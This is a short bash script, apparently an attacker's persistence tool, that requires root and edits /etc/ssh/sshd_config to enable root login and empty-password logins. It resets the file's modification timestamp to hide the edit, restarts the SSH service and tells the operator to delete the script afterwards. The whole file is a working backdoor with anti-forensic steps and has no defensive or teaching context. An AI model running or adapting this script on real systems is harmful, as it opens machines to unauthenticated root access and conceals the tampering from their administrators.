#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi

sshd_config_file="/etc/ssh/sshd_config"

if [ ! -f "$sshd_config_file" ]; then
	echo "[!] Configuration file '$sshd_config_file' does not exist"
	exit 1
fi

get_old_timestamp () {
	stat $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
}

# Allow root login and passwordless login via SSH by modifying the sshd configuration file
old_ssh_timestamp=$(get_old_timestamp $sshd_config_file)
sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/' $sshd_config_file
sed -i 's/.*PermitEmptyPasswords.*/PermitEmptyPasswords yes/' $sshd_config_file
touch -t $old_ssh_timestamp $sshd_config_file
echo "[+] Modified '$sshd_config_file'"

# Restart the sshd service
if which systemctl &>/dev/null; then
	systemctl restart sshd
elif which service &>/dev/null; then
	service sshd restart
else
	echo "[!] Could not restart sshd service with 'systemctl' or 'service'"
	exit 1
fi
echo "[+] Restarted the sshd service"

echo
echo "[!!!] Don't forget to delete me!"
